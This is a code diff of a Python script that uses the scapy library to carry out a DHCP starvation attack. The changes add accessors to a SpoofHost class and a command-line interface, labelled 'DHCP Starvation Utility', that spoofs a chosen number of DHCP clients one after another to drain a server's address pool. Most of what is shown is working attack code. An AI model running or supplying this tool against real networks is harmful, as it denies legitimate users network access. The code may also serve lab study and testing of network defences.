@@ -1,8 +1,8 @@
 from scapy.all import *
 from threading import Thread
-from time import sleep
 from utils import is_valid_MAC, IPV4_BROADCAST, IPV4_NETWORK, MAC_BROADCAST, starve_logger
-
+import argparse
+from time import sleep
 
 class SpoofHost():
     '''
@@ -18,6 +18,17 @@ class SpoofHost():
         self._ipv4_addr = None
 
         # print(self.filter)
+
+
+    @property
+    def mac(self):
+        return self._mac_addr
+
+
+    @property
+    def ip_addr(self):
+        if self._ipv4_addr is not None:
+            return self._ipv4_addr
 
 
     def sniff_callback(self, sniffed_pkt):
@@ -44,6 +55,7 @@ class SpoofHost():
             starve_logger.info(f"TRANSACTION {self._recent_transaction_id}: DHCP ACK from {self.dhcp_server_mac}.")
             starve_logger.info(f"TRANSACTION {self._recent_transaction_id}: DHCP handshake completed.")
 
+
     @staticmethod
     def sniff_thread(self):
         '''
@@ -57,14 +69,14 @@ class SpoofHost():
         Performs the actual starving functionality.
         '''
         # self.discover_pkt.show()
-        sniffer = Thread(target=self.sniff_thread, args=(self,))
-        sniffer.start()
+        self._sniffer = Thread(target=self.sniff_thread, args=(self,))
+        self._sniffer.start()
 
         try:
             disc = self.discover_pkt
             sendp(disc, verbose=0)
         except KeyboardInterrupt:
-            sniffer.join()
+            self._sniffer.join()
 
 
     @property
@@ -96,7 +108,20 @@ class SpoofHost():
 
 
 if __name__ == '__main__':
-    test = SpoofHost("b7:8f:0c:26:95:8f")
-    test.starve()
+    parser = argparse.ArgumentParser("DHCP Starvation Utility")
+    parser.add_argument("--num-hosts", dest="hosts", type=int, default=5, help="Number of DHCP clients to spoof.")
+    parser.add_argument("--delay", dest="delay", type=float, default=0.5, help="Delay between each host initiating DHCP handshake.")
+    parser.add_argument("--store-hosts", dest="store", action="store_true")
+    args = parser.parse_args()
 
-    # print(test.discover_pkt)
+    if args.store:
+        host_macs = set()
+    
+    for i in range(args.hosts):
+        host = SpoofHost()
+        if args.store:
+            host_macs.add(host.mac)
+        host.starve()
+        sleep(args.delay)
+    
+    starve_logger.info("Starvation completed!")
